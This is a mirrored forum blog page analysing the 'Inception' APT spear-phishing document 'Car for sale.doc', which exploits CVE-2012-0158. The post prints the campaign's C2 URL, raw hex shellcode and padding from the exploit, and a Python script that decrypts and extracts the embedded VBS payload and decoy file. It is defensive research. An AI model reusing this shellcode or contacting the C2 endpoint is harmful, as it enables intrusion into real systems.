<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">

<!-- Mirrored from garage4hackers.com/entry.php?b=3121 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:32:46 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
<base  /><!--[if IE]></base><![endif]-->
<meta name="generator" content="vBulletin 4.2.1" />
<meta http-equiv="X-UA-Compatible" content="IE=9" />

	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />


		<meta name="keywords" content="Apt inception, ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" />
		<meta name="description" content="Apt inception w@rri0r@bh@y" />



	<meta property="fb:app_id" content="170793809601191" />
<meta property="og:site_name" content="Garage4hackers Forum" />
<meta property="og:description" content="Apt inception w@rri0r@bh@y" />
<meta property="og:url" content="entryf3bc.html?b=3121" />
<meta property="og:type" content="article" />




	
		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "entry";
	var RELPATH = "entryf3bc.html?b=3121";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>



	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
	



	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	
		
			<link rel="alternate" type="application/rss+xml" title="w@rri0r@bh@y - Garage4hackers Forum Blog RSS Feed" href="blog_external127d.php?type=RSS2&amp;bloguserid=8196" />
		
		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Blog RSS Feed" href="blog_external9476.php?type=RSS2" />
	
	<link rel="pingback" href="forum.html" />
	
		<!--
			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
				xmlns:dc="http://purl.org/dc/elements/1.1/"
				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
			<rdf:Description
				rdf:about="http://garage4hackers.com/entry.php?b=3121"
				dc:identifier="http://garage4hackers.com/entry.php?b=3121"
				dc:title="Apt inception"
				trackback:ping="http://garage4hackers.com/blog_callback.php?b=3121" />
			</rdf:RDF>
		-->
	
	
		<link rel="stylesheet" type="text/css" href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" />
	
	<!--[if lt IE 8]>
	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
	<![endif]-->
	
	
	
	
		<script type="text/javascript">
		<!--
			vBulletin.register_control("vB_Blog_Userid", "8196");
		//-->
		</script>
	
<script type="text/javascript" src="clientscript/vbulletin_ajax_suggest6719.js?v=421"></script>
	
		<title>Apt inception - Blogs - Garage4hackers Forum</title>
	
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body >
<div class="above_body"> <!-- closing tag is in template navbar -->
<div id="header" class="floatcontainer doc_header">
	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
	<div id="toplinks" class="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a rel="help" href="faq.html">Help</a></li>
				<li>
			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset id="logindetails" class="logindetails">
					<div>
						<div>
					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
						</div>
					</div>
				</fieldset>
				<div id="remember" class="remember">
					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
				</div>

				<input type="hidden" name="s" value="" />
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="login" />
				<input type="hidden" name="vb_login_md5password" />
				<input type="hidden" name="vb_login_md5password_utf" />
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li id="fb_headerbox" class="hidden">

	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr />
</div>
<div id="navbar" class="navbar">
	<ul id="navtabs" class="navtabs floatcontainer">
		
		
	
		<li  id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li  id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li  id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
						
					
				
					
						
							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
						
					
				
					
						
							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
						
					
				
			</ul>
		

	
		<li  id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li  id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li  id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div id="globalsearch" class="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
				
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="process" />
				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div id="breadcrumb" class="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
		
	<li class="navbit"><a href="blog.html">Blogs</a></li>

	<li class="navbit"><a href="blog9ba5.html?u=8196">w@rri0r@bh@y</a></li>

		
	<li class="navbit lastnavbit"><span>Apt inception</span></li>

	</ul>
	<hr />
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-6847984837250662"
     data-ad-slot="4036513682"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
		<input type="hidden" name="do" value="dismissnotice" />
		<input type="hidden" name="s" value="" />
		<input type="hidden" name="securitytoken" value="guest" />
		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
		<input type="hidden" name="url" value="" />
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	<html>
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/entry.php?b=3121 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:32:46 GMT -->
</html>
</li>
		</ol>
	</form>



<div id="usercss" class="blog">
	<div class="cleardiv"></div>

	
	
	<div id="content_container">
		<div id="content">
			<div id="content_inner" class="blockrow restrain_container">
			<!-- main content -->
			<div id="pagetitle">
	
	<a id="rssicon" href="blog_external127d.php?type=RSS2&amp;bloguserid=8196" rel="nofollow"><img src="images/misc/rss_40b.html" border="0" class="inlineimg" alt="View RSS Feed" /></a>
	
	<h1>w@rri0r@bh@y</h1>
</div>




<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/11/10 blog entry */
google_ad_slot = "0606213533";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
<div id="above_blogentry">
	
</div>
<div class="block blogentrybit" id="entry3121">
	<h4 id="blog_title" class="blog_header">
		Apt inception
		
		
	</h4>
	<div class="fly">
		
			<div class="popupmenu" id="blograting">
				<h6><a class="popupctrl" href="javascript://" id="blograting_current"><img class="inlineimg" src="images/rating/rating-15_3.html" alt="Rating: 3 votes, 2.67 average." /></a></h6>
				<form action="../external.html?link=http://garage4hackers.com/blog.php" method="post" id="blog_blograte_form">
					<div class="popupbody popuphover">
						<ul>
							
								<li><label for="r5"><span class="rating r5">
									<input type="radio" name="vote" value="5" id="r5"  /> Excellent
								</span></label></li>
								<li><label for="r4"><span class="rating r4_right">
									<input type="radio" name="vote" value="4" id="r4"  /> Good
								</span></label></li>
								<li><label for="r3"><span class="rating r3_right">
									<input type="radio" name="vote" value="3" id="r3"  /> Average
								</span></label></li>
								<li><label for="r2"><span class="rating r2_right">
									<input type="radio" name="vote" value="2" id="r2"  /> Bad
								</span></label></li>
								<li><label for="r1"><span class="rating r1_right">
									<input type="radio" name="vote" value="1" id="r1"  /> Terrible
								</span></label></li>
								<li class="formsubmit"><input type="submit" class="button" value="Vote Now" /></li>
							
						</ul>
						<input type="hidden" name="s" value="" />
						<input type="hidden" name="securitytoken" value="guest" />
						<input type="hidden" name="do" value="rate" />
						<input type="hidden" name="b" value="3121" />
					</div>
				</form>
				<script type="text/javascript" src="clientscript/blog_ajax_rate6719.html?v=421"></script>
				<script type="text/javascript">
				<!--
					var blogid = 3121;
					vB_AJAX_BlogRate_Init('blog_blograte_form');
				//-->
				</script>
			</div>
		
	</div>
	<div class="block blogbit">
		<div class="bloghead">
			<div class="fly">
				
<a href="entryf3bc.html?b=3121#comments" class="comments">0 Comments</a>
				
				
			</div>
			<div class="blog_date">
				by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="member9ba5.html?u=8196" title="w@rri0r@bh@y is offline"><strong>w@rri0r@bh@y</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a href="member9ba5.html?u=8196" class="siteicon_profile">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a href="search4372.html?do=finduser&amp;userid=8196&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a href="privated8f4.html?do=newpm&amp;u=8196" class="siteicon_message" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="blog9ba5.html?u=8196" class="siteicon_blog" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		
		
		<li class="right">
			<a href="list4695.html?r=author/8196-w-rri0r-bh-y" class="siteicon_article" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>, 03-23-2015 at 05:09 PM  (0 Views)
			</div>
		</div>
		
			
<fb:like href="entryf3bc.html?b=3121" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
		
		<div class="blogbody postcontainer">
			<div id="entry_text_3121">
				<blockquote class="blogcontent restore floatcontainer">
					Greet: &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
In the month of Dec 2014 <a href="../external.html?link=https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-“-inception-framework”-very-sophisticated-layered-malware" target="_blank">BlueCoat</a> released report on APT campaign named ad &quot;Inception&quot;. The spear phishing mail was sent with attachment with various names we analyzed attachment which was named as &quot;Car for sale.doc&quot;. The Attachment was exploit (CVE-2012-0158) with embed VBS and decoy file themed an advertisement of a used car for sale that purportedly originated from Michael Hahne employee at the German Embassy. <br />
For writing this blog our main moto was to automate Extraction of large payload and decoy file used in APT Inception so that it can save time of researchers to extract payloads and possibly new varient of the malware.<br />
Decoy File<br />
------------<br />
<img src="attachment5f29.jpg?attachmentid=839&amp;d=1427109979" border="0" alt="Name:  1.JPG
Views: 196
Size:  39.2 KB"  /><br />
<br />
Payload<br />
---------<br />
VBE File -&gt; VBS File -&gt; Dll File -&gt; C2<br />
<br />
C2 Info<br />
--------<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://webdav.cloudme.com/chloe7400/CloudDrive/</pre>
</div>The sample we used can trigger vulnerability in both on MS office 2007 and MS office 2010. <br />
The following is the code attackers used<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">60016327FE6E6027454B414A4F45474A624A5F27303C58274241EB0C5F2858276EE55D277DFB5C274241EB04A2266027454A414A484A4E4A4A474D4281C41C010000FFE4AABC6127D41158276C0B5E27690D5E27100104000000010000000100F2C95C2724F3C0CC00BDEF9312EA95AC34A30DB700800000512B6027F11A5827B05154EC377F612749EC59274BC249C312313DE61CA07EC38CED582746EA592787946EAD923813C8F3C95C27F3C95C27F3C95C27AABC6127000A632759526227F2C95C2729565ADADC587CCF04574592000C0000E38C6127000A6327D354602728BC6027F11A582767EFC8DB12CB9FE4AC9D4BCDF2C95C2780000000512B6027DEB15C2766BB262666BB26264B4B414A4748434F4742434A434B42414149434F42414E4F494A4142434F484F434A4B4848434343484A4E41424A4E43464B424842484848474746424A4742424F4B464B4F434B4A4F464848484641434A4E4E4E484F48474241424E484B484748484848</pre>
</div>Attackers also used Following code instead of the Nop Slide.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">4B4B414A4748434F4742434A434B42414149434F42414E4F494A4142434F484F434A4B4848434343484A4E41424A4E43464B424842484848474746424A4742424F4B464B4F434B4A4F464848484641434A4E4E4E484F48474241424E484B484748484848</pre>
</div>We used following sample for creating extraction code:<br />
Md5 : 4624da84cae0f8b689169e24be8f7410<br />
Exploit - CVE-2012-0158<br />
<br />
Shell Code used in this sample was:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">6081ec001000008bec33c9648b35300000008b760c8b761c8b5e088b46088b7e208b3666394f1875f2e8050000009090909090895d04894508ff750868ad9b7ddfe8bf000000894520ff75086854caaf91e8af000000894524ff750868ac08da76e89f000000894528ff7508681665fa10e88f00000089452c6a045e5456ff552089859400000083f8ff750683c60456ebe983f80076f56a006a0068e657000056ff55288d85900000006a00506a088d859c0000005056ff552c81bd9c0000005054405475c689b5980000006a406800100000ffb5a00000006a00ff55248985a40000008d9d900000006a0053ffb5a000000050ffb598000000ff552c8b9da4000000ffe3558bec578b7d088b5d0c568b733c8b74337803f3568b762003f333c94941ad03c35633f60fbe1038d67408c1ce0d03f240ebf13bfe5e75e55a8beb8b5a2403dd668b0c4b8b5a1c03dd8b048b03c55e5f5dc2080</pre>
</div>After analysing sample we came with the Python Extractor which can be used for extracting Malware &amp; Decoy from the attachment/Doc exploit used in this Campaign:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decryption(file_size,file_decrypt):
        comp = &quot;&quot;
        xor_key = &quot;&quot;
        a = file_size-1
        for i in range(file_size-1,0,-1):
                xor_key = a % 0x100
                comp += chr(ord(file_decrypt[i]) ^ xor_key)
                a = a - 1
        comp1 = &quot;&quot;
        a1 = len(comp)-1
        for i in range (0,len(comp)-1,1):
            comp1 += comp[a1]
            a1 = a1 - 1
        return comp1

def vbs_swap(data):
    compl = &quot;&quot;
    a = 0
    b = 1
    comp = &quot;&quot;
    for i in range (0,0x200,2):
        compl += data[b]+data[a]
        a = a + 2
        b = b + 2
    comp = compl + data[0x200:]
    return comp

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        fl = file.read()
        file.close()
        
        if fl[:4] == &quot;{\\rt&quot;:
            found = fl.find(&quot;VPdPD&quot;)
            print &quot;Processing_APT_Inception_&quot; + sample
            file_decrypt = &quot;&quot;
            if found &gt; -1:
                file_decrypt = fl[found+0x1d:]
                file_size = len(file_decrypt)
                comp = decryption(file_size,file_decrypt)
                data = binascii.unhexlify('D0CF11')
                doc_file = comp.find(data)
                vbs_file = comp[8:doc_file]
                vbs_data = vbs_swap(vbs_file)
                doc_file1 = comp[doc_file:]
                vbs_ex = open(output+sample+&quot;.vbs&quot;,&quot;wb&quot;)
                vbs_ex.write(vbs_data)
                vbs_ex.close()
                doc_ex = open(output+sample+&quot;.doc&quot;,&quot;wb&quot;)
                doc_ex.write(doc_file1)
                doc_ex.close()
                mov_processed_file()
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div>

					
				</blockquote>
			</div>
				


				<div class="blogcontrol fly">
					
				</div>

				<div class="blogmeta">
					
					<p class="lastedited">
						<span class="shade">Updated 03-23-2015 at 05:59 PM by</span> <a href="member0612.html?u=16">41.w4r10r</a>
						
					</p>
					

					
					<div class="tags" id="blogtagcontainer_3121">
							Tags:
							<span id="blogtaglist_3121">
								
								None
								
							</span>
							
								<span id="blogtagmenu_3121"><a href="threadtaga3e0.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=3121"><img src="images/misc/blog/tag_edit.html" border="0" class="inlineimg" id="blogtag_3121" alt="Add / Edit Tags" /></a></span>
							
					</div>
					
				
					
					<dl class="blogcategory stats">
						<dt class="shade">Categories</dt>
						<dd>

	
		<a href="blogf743.html?u=8196&amp;blogcategoryid=-1">Uncategorized</a>
	
</dd>
					</dl>
					
				</div>
				<ul class="entrycontrols">
					
					
					
					
					
				</ul>

		</div>
	</div>

</div>

<div id="navlinks">
	<!-- top navlinks -->
	
		&laquo; <a href="blogd313.html?b=3121&amp;goto=prev">Prev</a>
		&nbsp;&nbsp;&nbsp;
	
	<a href="blog9ba5.html?u=8196">Main</a>
		
			&nbsp;&nbsp;&nbsp;
			<a href="blogf5d9.html?b=3121&amp;goto=next">Next</a> &raquo;
		
	<!-- end top navlinks -->
</div>




<!-- lightbox scripts -->
	<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_Lightbox_Container", "entry3121", 1);
	//-->
	</script>
<!-- / lightbox scripts -->




<h2 id="comments_heading" class="commentsheader"><a name="comments"></a>Comments</h2>

<div id="above_comments" class="floatcontainer">
	
	
		
</div>

<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=3121" method="post" id="commentform" class="block">
	

	<div id="below_comments" class="floatcontainer">
		
	</div>

	<input type="hidden" name="s" value="" />
	<input type="hidden" name="securitytoken" value="guest" />
	<input type="hidden" name="b" value="3121" />
	<input type="hidden" name="bt" value="" />
	<input type="hidden" name="url" value="" />
	<input type="hidden" name="userid" value="8196" />
</form>








	
		<!-- Editor Scripts -->
<script type="text/javascript">
<!--

var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';

var ltr = 'left';



var ignorequotechars = 1;
var allowbasicbbcode = false;

// vB Phrases
vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
vbphrase["click_quick_reply_icon"]       = "";
vbphrase["all_files"]                    = "All Files";
vbphrase["file_is_too_large"]            = "File is too Large";
vbphrase["invalid_file"]                 = "Invalid File";
vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";

//-->
</script>
<!-- / Editor Scripts -->
		<script type="text/javascript" src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421"></script><script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
	
<div id="ajax_post_errors" class="hidden">
	<div class="block">
		<div class="blockhead floatcontainer">
			<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" /></span>
			<h2>vBulletin Message</h2>
		</div>
		<div class="blockbody">
			<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
		</div>
		<div class="blockfoot">
			<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
		</div>
	</div>
</div>
	<script type="text/javascript" src="clientscript/blog_quick_edit6719.html?v=421"></script>
	




	

	<h2 id="trackbacks_heading" class="commentsheader"><a name="trackbacks"></a>Trackbacks</h2>

	<div class="trackbacks_block">
		<span class="shade">Total Trackbacks</span> 0
	
		<div class="shade">
			<a href="entryf3bc.html?b=3121" title="Trackback URL" class="shade">No other blogs currently reference this blog entry</a>
		</div>
	

		
		
		<div id="trackbackurl">
			Trackback URL: <input type="text" value="http://garage4hackers.com/blog_callback.php?b=3121" onmouseover="this.select();" />
		</div>
		
	</div>

	


<script type="text/javascript">
<!--
	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "3121");
    extra = {
    //
    };

    extra.userid = "8196";

    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "3121", "blog", extra);
//-->
</script>
<script type="text/javascript" src="clientscript/vbulletin_menu6719.html?v=421"></script>
<script type="text/javascript" src="clientscript/vbulletin_ajax_tageditor6719.html?v=421"></script>
			<!-- End main content -->
		        </div>
		</div>
	</div>
	<div id="sidebar_container"><h6 class="actionbutton_container">
	
		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
	
	</h6>

<div id="blog_user_sidebar">
	

	<div class="block mainblock">
		<div class="blocksubhead"><a class="username offline" href="member9ba5.html?u=8196">w@rri0r@bh@y</a></div>
		<div id="userinfoblock" class="floatcontainer">
			
			<a class="avatar" href="member9ba5.html?u=8196" title="w@rri0r@bh@y's Avatar">
				<span class="avatarcontainer"><img src="images/misc/unknown.html" alt="w@rri0r@bh@y's Avatar" /></span>
			</a>
			
				
			<ul class="list_no_decoration" id="usermenu">
				
					<li>
						<a href="member9ba5.html?u=8196"><img src="images/site_icons/profile.html" alt="Go to Profile" /> Go to Profile</a>
					</li>
				
				
				

				
				
				<li>
					<a href="blog76b9.html?u=8196&amp;do=markread&amp;readhash=" rel="nofollow"><img src="images/site_icons/markasread.html" alt="Mark as Read" /> Mark as Read</a>
				</li>
				
				
			</ul>
		</div>

		<div class="blockbody">
			<div class="blockrow">
				<div id="userstats">
					
					<dl class="stats">
						<dt>Join Date</dt>
						<dd>Feb 2014</dd>
					</dl>
					
					
					
					<dl class="stats">
						<dt>Posts</dt>
						<dd>6</dd>
					</dl>
					<dl class="stats">
						<dt>Blog Entries</dt>
						<dd>5</dd>
					</dl>
					
					
					
					
					
				</div>

				
			</div>		
		</div>
	</div>
	<div class="underblock"></div>

	

	

	

	<ul id="moveable_blocks">
		
		
		
		
		
		
		
		
	<li id="block_category">
		<div class="block categoryblock" id="block_category_div">
			<div class="blocksubhead smaller moveable"  id="block_category_handle">
				<a href="#top" id="collapse_c_blog_categories" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
				
				Blog Categories
			</div>
			<div class="blockbody" id="c_blog_categories">
				<div class="blockrow">
					
					
						<h2 class="local">Local Categories</h2>
						<ul class="folderlist hideoverflow">
							
<li>
	<img src="images/misc/blog/folder.html" class="inlineimg" alt="Uncategorized" border="0" />
	
		
			<a href="blogf743.html?u=8196&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
		
	
</li>
						</ul>
					
				</div>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	<li id="block_entries">
		<div class="block smaller moveable" id="block_entries_div">
			<div class="blocksubhead"  id="block_entries_handle">
				<a href="#top" id="collapse_c_blog_entries" class="collapse"><img id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png" alt="" /></a>
				<a href="blog9ba5.html?u=8196">Recent Blog Posts</a>
